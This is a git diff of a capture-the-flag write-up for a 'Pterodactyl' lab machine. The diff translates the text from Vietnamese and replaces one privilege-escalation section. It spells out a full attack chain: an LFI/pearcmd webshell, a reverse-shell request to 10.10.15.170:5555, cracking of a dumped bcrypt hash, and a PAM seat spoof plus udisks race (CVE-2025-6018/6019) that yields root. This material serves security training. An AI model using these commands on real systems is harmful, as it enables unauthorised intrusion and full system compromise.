@@ -93,15 +93,15 @@ GET /locales/locale.json?locale=../../../../../tmp&namespace=sora1 HTTP/1.1
 
 ![](images/6.png)
 
-Vậy để có reverse shell, tôi sẽ tạo 1 file có chứa payload nhận tham số lệnh vào thuận tiện cho thực thi lệnh.
+So, to create a reverse shell, I will create a file containing a payload that receives command parameters conveniently for command execution.
 
-Tạo file:
+Create file:
 
 ```
 GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_GET['c'])?>+/tmp/sora.php HTTP/1.1
 ```
 
-Chạy Payload:
+Run Payload:
 
 ```
 GET /locales/locale.json?locale=../../../../../tmp&namespace=sora&c=sh+-i+>%26+/dev/tcp/10.10.15.170/5555+0>%261 HTTP/1.1
@@ -109,18 +109,18 @@ GET /locales/locale.json?locale=../../../../../tmp&namespace=sora&c=sh+-i+>%26+/
 
 ![](images/7.png)
 
-Từ đây hoàn toàn có thể lấy được flag `user.txt`
+From here, it's entirely possible to retrieve the flag `user.txt`.
 # Privilege Escalation
 
 ## Shell as `phileasfogg3`
 
-Không thể truy cập trực tiếp vào cơ sở dữ liệu bằng `mysql`, do đó thử sử dụng:
+It's not possible to access the database directly using `mysql`, so try using:
 
 ```
 php artisan tinker
 ```
 
-Sau đó dump toàn bộ users:
+Then dump all users:
 
 ```zsh
 \Pterodactyl\Models\User::all();
@@ -136,7 +136,7 @@ username: "phileasfogg3",
         #password: "$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi",
 ```
 
-Có thể crack password của user `phileasfogg3`
+It is possible to crack the password of user `phileasfogg3`
 
 ```zsh
 hashcat -m 3200 '$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi' /usr/share/wordlists/rockyou.txt
@@ -144,137 +144,129 @@ hashcat -m 3200 '$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi' /
 
 The password after cracked: `!QAZ2wsx`
 
-Lúc này có thể dùng để ssh.
+It can be used for SSH now.
 
 ```zsh
 ssh phileasfogg3@pterodactyl.htb
 ```
-## /usr/bin/facter
+## uudisks
 
-Có một email nhắc về lỗ hổng
+`sudo -l` shows (ALL) ALL but with [targetpw](https://superuser.com/questions/161593/how-do-i-make-sudo-ask-for-the-root-password),  we cannot easily escalate with sudo.
 
-![](../../9.png)
+![](images/11.png)
 
-```ruby
-#!/usr/bin/ruby
-success = system("id")
-if success
-  puts "Command executed successfully."
-else
-  puts "Command failed."
-end
-```
+There was an email mentioning the vulnerability:
 
-Then run exploit
+![](images/9.png)
+
+`CVE-2025-6019` – Race Condition via udisks2 + libblockdev
+
+## CVE-2025-6018 + CVE-2025-6019
+
+Create a malicious XFS image (on the attacker's machine).
 
 ```zsh
-sudo /usr/bin/facter --custom-dir=. x
-```
-
-![](../Facts/images/3.png)
-
-Modified to get root
-```ruby
-#!/usr/bin/ruby
-system("chmod u+s /bin/bash")
-```
-
-
-
-```zsh
-#################
-
-# Attack machine
-
-#################
-
-sudo apt install xfsprogs -y
-
-rm -f xfs.image
-
-rm -rf xfsmnt
-
-# Create image
-
-dd if=/dev/zero of=xfs.image bs=1M count=300
-
-# Format as XFS (this will now work!)
-
-sudo mkfs.xfs -f xfs.image
-
-# Verify it's XFS
-
-file xfs.image
-
-# Should say: "SGI XFS filesystem data"
-
-# Mount and add SUID shell
-
+dd if=/dev/zero of=xfs_sora.img bs=1M count=300
+sudo mkfs.xfs -f xfs_sora.img
 mkdir xfsmnt
-
-sudo mount xfs.image xfsmnt
-
+sudo mount xfs_sora.img xfsmnt
 sudo cp /bin/bash xfsmnt/bash
-
 sudo chmod 4755 xfsmnt/bash
-
-sudo ls -la xfsmnt/bash
-
 sudo umount xfsmnt
-
-# Final verification
-
-file xfs.image
-
-hexdump -C xfs.image | head -3
-
-# Should see "XFSB" magic bytes
-
-scp xfs.image phileasfogg3@pterodactyl.htb:/tmp/xfs_real.image
-
-##############
-
-# on pterodactyl
-
-##############
-
-hexdump -C /tmp/xfs_real.image | head -20
-
-phileasfogg3@pterodactyl:/tmp> killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null
-
-phileasfogg3@pterodactyl:/tmp> udisksctl loop-setup --file /tmp/xfs_real.image --no-user-interaction
-
-Mapped file /tmp/xfs_real.image as /dev/loop5.
-
-##########check loop device (5)
-
-phileasfogg3@pterodactyl:/tmp> while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break; done 2>/dev/null &
-
-[4] 18575
-
-###in command below check that you use loop device above(5)
-
-phileasfogg3@pterodactyl:/tmp> gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop5 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
-
-Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem on /dev/loop5: Failed to unmount '/dev/loop5' after resizing it: target is busy
-
-phileasfogg3@pterodactyl:/tmp> -rwsr-xr-x 1 root root 1265648 Feb 7 23:54 /tmp/blockdev.7XM7J3/bash
-
--rwsr-xr-x 1 root root 1265648 Feb 7 23:54 /tmp/blockdev.7XM7J3/bash
-
--rwsr-xr-x 1 root root 1265648 Feb 7 23:54 /tmp/blockdev.7XM7J3/bash
-
--rwsr-xr-x 1 root root 1265648 Feb 7 23:54 /tmp/blockdev.7XM7J3/bash
-
-phileasfogg3@pterodactyl:/tmp> /tmp/blockdev*/bash -p
-
-bash-5.2# id
-
-uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
-
-bash-5.2# cat /root/root.txt
-
-12bcc....
-
-bash-5.2#
+scp xfs_sora.img phileasfogg3@pterodactyl.htb:/tmp/
 ```
+
+Create loop device:
+
+```zsh
+phileasfogg3@pterodactyl:/tmp> udisksctl loop-setup --file /tmp/xfs_real.image --no-user-interactionError setting up loop device for /tmp/xfs_real.image: GDBus.Error:org.freedesktop.UDisks2.Error.NotAuthorizedCanObtain: Not authorized to perform operation
+```
+
+We are blocked from running udiskctl. Because the SSH session is always Remote=yes, Polkit is blocking "dangerous" actions.
+
+Check session
+
+```zsh
+loginctl show-session $XDG_SESSION_ID -p Seat -p Remote -p Active -p State
+
+Id=64 
+Seat=
+Remote=yes 
+Active=yes 
+State=active
+```
+
+I'm active (Active=yes) but I'm still being blocked because the session is remote (Remote=yes).
+
+So how can I fake an SSH session to a local console session?
+
+A quick search: “pam_environment seat0” -> “fake local session polkit ssh” -> `CVE-2025-6018`
+
+```zsh
+cat > ~/.pam_environment << 'EOF' 
+XDG_SEAT=seat0 
+XDG_VTNR=1 
+EOF
+
+exit
+```
+
+```zsh
+ssh phileasfogg3@pterodactyl.htb
+phileasfogg3@pterodactyl:~> loginctl show-session $XDG_SESSION_ID -p Seat -p Remote -p Active
+Seat=seat0
+Remote=yes
+Active=yes
+```
+
+Now we are acting as a user sitting in front of a real (local) machine and have the right to run udisk.
+Check if `seat0` is present?
+
+```zsh
+loginctl show-session $XDG_SESSION_ID -p Seat -p Remote -p Active
+Seat=seat0
+Remote=yes
+Active=yes
+```
+
+## Shell as root
+
+Use the allow_active permission to create a race condition and run the root binary.
+
+```zsh
+phileasfogg3@pterodactyl:/tmp> udisksctl loop-setup --file /tmp/xfs_sora.img --no-user-interaction
+Mapped file /tmp/xfs_sora.img as /dev/loop0.
+phileasfogg3@pterodactyl:/tmp> while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break; done 2>/dev/null &
+[1] 10783
+phileasfogg3@pterodactyl:/tmp> gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
+Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem on /dev/loop0: Failed to unmount '/dev/loop0' after resizing it: target is busy
+phileasfogg3@pterodactyl:/tmp> -rwsr-xr-x 1 root root 1380656 Feb 13 05:05 /tmp/blockdev.JCQBK3/bash
+^C
+[1]+  Done                    while true; do
+    /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break;
+done 2> /dev/null
+phileasfogg3@pterodactyl:/tmp> /tmp/blockdev*/bash -p
+bash-5.3# id
+uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
+```
+
+![](images/10.png)
+
+Summary:
+- **CVE-2025-6018** (in PAM) -> Upgrades SSH session from "remote" to "allow_active" (equivalent to a user sitting in front of a real machine).
+
+- **CVE-2025-6019** (in udisks2 + libblockdev) -> Uses allow_active privilege to create a race condition and run the root binary.
+
+Timeline:
+
+SSH Session (Remote=yes) 
+        ↓ (PAM injection)
+     Seat=seat0 → polkit: allow_active = yes
+        ↓
+udisksctl loop-setup → creates /dev/loopX
+        ↓
+Filesystem.Resize (D-Bus) 
+        ↓
+libblockdev: mount /tmp/blockdev.XXXX → NO nosuid flag
+        ↓
+SUID bash runs as root → WIN
